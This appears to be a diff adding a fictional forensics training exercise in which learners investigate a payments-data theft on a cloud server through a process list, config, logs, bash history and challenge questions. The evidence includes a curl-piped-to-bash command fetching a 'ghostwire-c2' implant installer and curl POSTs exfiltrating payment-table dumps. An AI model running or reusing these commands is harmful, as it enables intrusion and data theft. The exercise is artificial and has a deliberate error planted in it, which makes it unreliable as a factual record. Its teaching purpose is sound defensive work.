@@ -1,0 +1,147 @@
+╔══════════════════════════════════════════════════════════════════════════╗
+║  OPERATION GHOSTWIRE — EVIDENCE FILE 3 of 4                             ║
+║  NovaPay Inc. — Endpoint Forensics                                      ║
+║  Source: AWS EC2 instance i-0a8b4f3c (hostname: svc-metrics-collector)  ║
+║  OS: Ubuntu 22.04 LTS  |  Instance type: t3.micro                       ║
+╚══════════════════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION A: PROCESS LIST — captured at 2024-03-11T05:30:00Z
+           (via SSM Run Command — no agent on host)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+PID    PPID   USER       START     CMD
+1      0      root       04:02     /sbin/init
+411    1      root       04:02     /lib/systemd/systemd-journald
+504    1      root       04:02     sshd: /usr/sbin/sshd -D
+812    504    ubuntu     04:03     sshd: ubuntu@pts/0
+813    812    ubuntu     04:03     -bash
+1001   813    ubuntu     04:03     python3 /opt/metrics/collector.py
+1002   1001   ubuntu     04:03     python3 /opt/metrics/collector.py  [SAME PID PARENT — forked]
+1101   1002   ubuntu     04:05     /bin/sh -c "psql postgresql://svc_metrics:REDACTED@10.0.5.12..."
+1102   1101   ubuntu     04:05     psql postgresql://svc_metrics:[REDACTED]@10.0.5.12/payments_db
+2201   1      root       04:07     curl -s -X POST https://metrics.novapay.io/v1/ingest \
+                                        -H "Authorization: Bearer eyJhbGc..." \
+                                        -d @/tmp/.cache/chunk_001.bin
+2202   1      root       04:09     curl -s -X POST https://metrics.novapay.io/v1/ingest \
+                                        -H "Authorization: Bearer eyJhbGc..." \
+                                        -d @/tmp/.cache/chunk_002.bin
+
+[PROCESSES 2203 through 2320 are identical curl commands to metrics.novapay.io
+ with incrementing chunk filenames — omitted for brevity]
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION B: FILESYSTEM ARTIFACTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+$ ls -la /opt/metrics/
+total 32
+drwxr-xr-x  2 ubuntu ubuntu 4096 Mar 11 04:02 .
+drwxr-xr-x 12 root   root   4096 Mar 11 04:02 ..
+-rwxr-xr-x  1 ubuntu ubuntu 8841 Mar 11 04:02 collector.py
+-rw-r--r--  1 ubuntu ubuntu  312 Mar 11 04:02 config.json
+
+$ cat /opt/metrics/config.json
+{
+  "db_host": "10.0.5.12",
+  "db_name": "payments_db",
+  "db_user": "svc_metrics",
+  "ingest_endpoint": "https://metrics.novapay.io/v1/ingest",
+  "ingest_interval_seconds": 120,
+  "query": "SELECT * FROM transactions ORDER BY created_at DESC",
+  "chunk_size": 247552,
+  "staging_dir": "/tmp/.cache/",
+  "cleanup_after_send": true
+}
+
+$ ls -la /tmp/.cache/
+total 8
+drwxrwxrwt  2 ubuntu ubuntu 4096 Mar 11 05:28 .
+drwxrwxrwt 15 root   root   4096 Mar 11 04:02 ..
+[DIRECTORY IS EMPTY — cleanup_after_send deleted all chunks]
+
+$ cat /var/log/syslog | grep collector | head -20
+Mar 11 04:03:01 svc-metrics-collector systemd[1]: Started metrics-collector.service
+Mar 11 04:03:01 svc-metrics-collector collector.py[1001]: Connecting to payments_db
+Mar 11 04:03:01 svc-metrics-collector collector.py[1001]: Connected. Running query...
+Mar 11 04:05:14 svc-metrics-collector collector.py[1001]: Query returned 8,847 rows
+Mar 11 04:05:14 svc-metrics-collector collector.py[1001]: Staging 37 chunks to /tmp/.cache/
+Mar 11 04:05:14 svc-metrics-collector collector.py[1001]: Sending chunk 1/37 to ingest endpoint
+...
+Mar 11 05:17:43 svc-metrics-collector collector.py[1001]: Chunk 37/37 sent. Cleaning up.
+Mar 11 05:17:43 svc-metrics-collector collector.py[1001]: Exfiltration complete. [OOPS]
+
+$ cat /etc/systemd/system/metrics-collector.service
+[Unit]
+Description=NovaPay Metrics Collector
+After=network.target
+
+[Service]
+Type=simple
+User=ubuntu
+ExecStart=/usr/bin/python3 /opt/metrics/collector.py
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION C: BASH HISTORY — user ubuntu (partial, some history cleared)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  1  uname -a
+  2  id
+  3  cat /etc/passwd | grep -v nologin
+  4  ls /opt/
+  5  curl -s https://raw.githubusercontent.com/ghostwire-c2/implant/main/install.sh | bash
+  6  [HISTORY CLEARED]
+  7  ls /opt/metrics/
+  8  cat /opt/metrics/config.json
+  9  systemctl enable metrics-collector.service
+ 10  systemctl start metrics-collector.service
+ 11  history -c
+
+[NOTE: Line 5 URL returns 404 now — repo was deleted or made private]
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+CHALLENGE QUESTIONS FOR EVIDENCE FILE 3
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Q1. Section A — Process List
+    a) PID 1002 is a fork of PID 1001 (collector.py). The fork spawns
+       a psql command (PID 1101/1102). Why does forking a process and
+       running system commands from it matter from a detection standpoint?
+       (Hint: think about what a legitimate metrics tool would do differently)
+    b) The curl processes (PID 2201+) are spawned by root (PPID=1),
+       but collector.py runs as ubuntu. How did commands from collector.py
+       end up running as root? What does this imply about the systemd unit?
+       (There is actually a subtle error here — find it)
+    c) The curl command sends files from /tmp/.cache/ — a hidden directory
+       inside /tmp. Why is /tmp a common attacker staging location?
+
+Q2. Section B — Filesystem
+    a) config.json contains "query": "SELECT * FROM transactions ORDER BY
+       created_at DESC". What is dangerous about SELECT * on a payments table?
+       What data would this expose, and what compliance frameworks care?
+    b) The log says "Exfiltration complete." — the word "Exfiltration" appears
+       verbatim in the syslog. What does this tell you about the attacker's OPSEC?
+    c) cleanup_after_send=true deleted all chunk files. Does this mean the
+       data is unrecoverable? What forensic sources might still have it?
+       (List at least 3 places to look)
+
+Q3. Section C — Bash History
+    a) Line 5: curl ... | bash — a classic pattern. Explain exactly what
+       this command does and why security professionals consider it dangerous.
+    b) The attacker ran history -c (line 11) but the file still shows entries.
+       Why? What does this tell you about how bash history actually works?
+    c) The install script URL returns 404 now. Does that mean you can't
+       recover what it contained? What service might have cached it?
+
+Q4. SYNTHESIS — connect this to Evidence Files 1 and 2:
+    The svc_metrics DB user was created in Evidence File 1 at 04:02:18Z.
+    This script started connecting to the DB at 04:03:01.
+    That's a 43-second gap.
+    What had to happen in those 43 seconds? List the steps in order.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
